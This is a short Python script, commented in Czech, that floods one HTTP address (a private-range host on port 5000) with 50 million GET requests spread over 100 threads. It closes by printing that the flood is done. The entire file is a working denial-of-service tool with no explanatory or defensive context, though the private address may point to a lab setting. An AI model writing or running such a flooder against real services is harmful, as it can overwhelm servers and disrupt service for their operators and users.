import requests
import threading

TARGET_URL = "http://10.0.1.12:5000"
ROUNDS = 50000000
THREADS = 100  # Počet souběžných vláken

def flood():
    for _ in range(ROUNDS // THREADS):
        try:
            response = requests.get(TARGET_URL)
            print(f"Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Spuštění více vláken
thread_list = []

for i in range(THREADS):
    t = threading.Thread(target=flood)
    t.start()
    thread_list.append(t)

# Čekání na dokončení všech vláken
for t in thread_list:
    t.join()

print("Flood dokončen.")
